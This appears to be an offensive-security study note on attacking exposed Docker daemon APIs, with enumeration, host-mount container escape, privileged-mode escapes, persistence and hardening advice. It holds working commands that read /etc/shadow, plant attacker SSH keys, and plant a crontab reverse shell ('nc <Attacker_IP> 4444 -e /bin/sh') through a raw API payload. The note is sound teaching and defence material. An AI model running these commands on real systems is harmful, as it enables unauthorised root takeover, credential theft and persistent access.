---
tags: [docker, api, container-escape, daemon, volume-mount]
difficulty: advanced
module: "35 - Network Protocol Attacks"
topic: "35.20 Docker API"
---

# 20 - Docker API: Exposed Daemon & Container Escape

## 1. Executive Summary

Docker revolutionized software deployment by popularizing containerization. At the core of Docker is the Docker Daemon (`dockerd`), a background service that manages containers, images, volumes, and networks. Developers and DevOps pipelines interact with this daemon via the Docker Engine REST API.

By default, the Docker daemon listens locally on a Unix socket (`/var/run/docker.sock`). However, administrators frequently configure the daemon to listen over the network on **TCP Port 2375 (HTTP, unencrypted)** or **Port 2376 (HTTPS, encrypted)** for remote management. If port 2375 is exposed without authentication, it yields instantaneous, unauthenticated Remote Code Execution (RCE) with `root` privileges on the underlying host system. 

## 2. Protocol Overview & Architecture

The Docker API is a standard RESTful HTTP interface. When you run a command like `docker run alpine`, the Docker CLI client translates this into a series of HTTP POST requests sent to the daemon.

### Architecture Nuances
- **The Daemon Runs as Root:** The `dockerd` process almost always runs as root. Therefore, any commands executed via the API are executed with root privileges.
- **Container Isolation vs. Mounts:** Containers use Linux namespaces and cgroups for isolation. However, the Docker API allows users to arbitrarily mount directories from the host filesystem into the container (Volume Mounting). This is the primary vector for container escape.

## 3. Enumeration & Footprinting

Identifying an exposed Docker API is trivial as it responds to standard HTTP requests.

### Nmap Enumeration
```bash
nmap -p 2375,2376 -sV <Target_IP>
```

### Direct API Interaction
You can query the API directly using `curl` to verify unauthenticated access and extract host information.

```bash
# Check API version and daemon information
curl -s http://<Target_IP>:2375/version

# Extract granular details about the host OS, CPUs, and runtime
curl -s http://<Target_IP>:2375/info

# List all running containers
curl -s http://<Target_IP>:2375/containers/json
```

### Using the Native Docker Client
If the port is exposed, you can simply point your local Docker CLI to the remote target.

```bash
docker -H tcp://<Target_IP>:2375 ps
docker -H tcp://<Target_IP>:2375 images
```

## 4. Exploitation: Achieving Host RCE (Container Escape)

Exploiting an open Docker API does not just give you access to a container; it gives you total control of the host machine. The most reliable exploit involves creating a new, privileged container and mounting the host's root filesystem (`/`) into it.

### Step-by-Step Exploitation via CLI

**1. Deploy Malicious Container with Host Mount**
We instruct the remote Docker daemon to run a lightweight image (like `alpine` or `ubuntu`), mount the host's `/` directory to `/mnt` inside the container, and drop us into a shell.

```bash
docker -H tcp://<Target_IP>:2375 run -v /:/mnt --rm -it alpine sh
```

**2. Chroot into the Host Filesystem**
Once inside the container, the host's filesystem is fully accessible at `/mnt`. By using `chroot`, we break out of the container's apparent filesystem and adopt the host's filesystem as our root.

```bash
# Inside the container:
chroot /mnt
```

**3. Total Compromise**
You are now root on the host machine. You can read the shadow file, add SSH keys, or manipulate the crontab.

```bash
# Read hashes
cat /etc/shadow

# Drop SSH key for persistent access
echo "ssh-rsa AAAAB3Nza... attacker" >> /root/.ssh/authorized_keys
```

### Exploitation via Raw API Requests (cURL)
If the Docker CLI is unavailable, the attack can be performed natively via HTTP requests.

```bash
# 1. Create a container, mapping host '/' to '/host'
curl -X POST -H "Content-Type: application/json" -d '{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "echo \"* * * * * root /bin/nc <Attacker_IP> 4444 -e /bin/sh\" >> /host/etc/crontab"],
  "HostConfig": {
    "Binds": ["/:/host"]
  }
}' http://<Target_IP>:2375/containers/create

# 2. Extract the Container ID from the response
# 3. Start the container
curl -X POST http://<Target_IP>:2375/containers/<Container_ID>/start
```

## 5. Advanced Container Escapes

If an attacker lands *inside* a container via a web vulnerability (e.g., Command Injection) and the Docker API is not exposed on the network, they must look for local escape vectors.

### 5.1 The Exposed Docker Socket
Often, developers mount the Docker socket inside the container (`-v /var/run/docker.sock:/var/run/docker.sock`) to allow the container to spawn other containers (e.g., Jenkins CI/CD nodes).
If you find this socket inside your compromised container, you can download a static `docker` binary and use it to execute the host-mount attack detailed above.
```bash
./docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine sh
```

### 5.2 Privileged Mode (`--privileged`)
If the container was started with the `--privileged` flag, isolation protections (AppArmor, Seccomp, cgroups) are stripped, and host device nodes are exposed.

```bash
# Check for exposed disk devices
fdisk -l

# Mount the host's primary disk partition directly
mkdir /host_drive
mount /dev/sda1 /host_drive
chroot /host_drive
```

### 5.3 Capability Abuse (`CAP_SYS_ADMIN`, `CAP_SYS_MODULE`)
If specific capabilities are granted, they can be abused. For instance, `CAP_SYS_MODULE` allows an attacker to compile a malicious kernel module (LKM), load it into the kernel, and execute arbitrary code in ring 0.

## 6. ASCII Architecture & Attack Diagram

```text
+-------------------+                 +---------------------------------+
|                   |  TCP 2375       |        Target Server            |
|   Attacker        |================>|   Docker Daemon (dockerd)       |
|                   |  API Call       |   (Unauthenticated HTTP API)    |
+-------------------+                 +---------------------------------+
            |                                         |
            | 1. POST /containers/create              |
            |    Image: alpine                        |
            |    Mount: / -> /mnt                     |
            |---------------------------------------->|
                                                      |
                                                      v
                                      +---------------------------------+
                                      |       Malicious Container       |
                                      |                                 |
                                      |   /mnt/etc/shadow <-----------+ |
                                      |   /mnt/root/.ssh/ <---------+ | |
                                      |                             | | |
                                      |  Host Filesystem Mapped Here! | |
                                      +---------------------------------+
                                                      |
                                                      | 2. chroot /mnt
                                                      v
                                      +---------------------------------+
                                      |        Host OS System           |
                                      |        (Compromised as root)    |
                                      +---------------------------------+
```

## 7. Post-Exploitation & Persistence

- **Living off the Land:** Using Docker itself as persistence. An attacker can create a hidden container running a reverse shell that automatically restarts on boot (`--restart always`).
- **Lateral Movement:** Extracting environment variables from legitimate containers. Docker environments frequently pass cloud API keys, database credentials, and secrets via environment variables (`docker inspect <container_id>`).

## 8. Defense, Mitigation, & Hardening

1. **Never Expose Unauthenticated APIs:** Never bind Docker to `0.0.0.0:2375`. If remote access is required, enforce mTLS (Mutual TLS) on port 2376, ensuring only clients with a valid certificate can interact with the daemon.
2. **Socket Protections:** Do not mount `/var/run/docker.sock` into containers unless absolutely unavoidable. If necessary, use proxies like `docker-socket-proxy` to restrict API paths (e.g., block `/containers/create`).
3. **Drop Capabilities:** Run containers with minimal privileges. Drop all capabilities and add only what is needed: `--cap-drop=ALL --cap-add=NET_BIND_SERVICE`.
4. **Rootless Docker:** Run the Docker daemon as a non-root user. This ensures that even if a container escape occurs, the attacker only lands as an unprivileged user on the host.

## 9. Chaining Opportunities

- **Web Shell to Container Escape:** Gaining RCE via a web vulnerability **[[05 - Command Injection]]** often drops the attacker inside a container. The next logical step is to enumerate the container for the `docker.sock` or `--privileged` flags to escape to the host.
- **SSRF:** The Docker REST API is heavily susceptible to SSRF. If a web app on the host has an SSRF vulnerability, it can hit `http://127.0.0.1:2375` to spawn containers. See **[[07 - Server-Side Request Forgery (SSRF)]]**.

## 10. Related Notes
- [[21 - Kubernetes API — Unauthenticated Access, RBAC Bypass]]
- [[08 - Linux Privilege Escalation]]
- [[16 - Redis — Unauthenticated Access, RCE via Config Set]]
- [[17 - MongoDB — No Auth, Exposed Port]]
